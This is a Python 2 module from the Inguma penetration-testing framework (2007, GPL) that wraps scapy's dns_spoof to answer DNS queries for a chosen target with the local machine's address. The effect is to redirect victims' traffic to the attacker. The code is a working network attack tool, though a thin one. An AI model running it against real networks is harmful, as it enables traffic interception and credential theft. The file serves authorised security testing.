#!/usr/bin/python
"""
Module DNS Spoof for Inguma
Copyright (c) 2007 Joxean Koret <joxeankoret@yahoo.es>

License is GPL
"""


try:
    from lib.scapy import get_if_addr, get_working_if, dns_spoof, conf
    bHasScapy = True
except:
    bHasScapy = False

if bHasScapy == False:
    try:
        from lib.winscapy import get_if_addr, get_working_if, dns_spoof, conf
        bHasScapy = True
    except:
        bHasScapy = False

from lib.core import getMacVendor
from lib.libexploit import CIngumaModule

name = "dnsspoof"
brief_description = "DNS spoofing tool"
type = "gather"

globals = ["interval", ]

class CDnsSpoof(CIngumaModule):

    target = ""
    waitTime = 0
    timeout = 2
    wizard = False
    interval = 30
    dict = None
    address = ""

    def help(self):
        print "target = <target host or network>"

    def run(self):
        if self.target == "" or self.target.lower() == "localhost":
            self.gom.echo( "[!] No target (or valid target) selected." )
            return False

        conf.verb = 2
        self.address = get_if_addr(get_working_if())
        self.gom.echo( "[+] Using " + str(self.address) )
        dns_spoof(joker=self.address, match={"any":self.target})
        return True
    
    def printSummary(self):
        pass
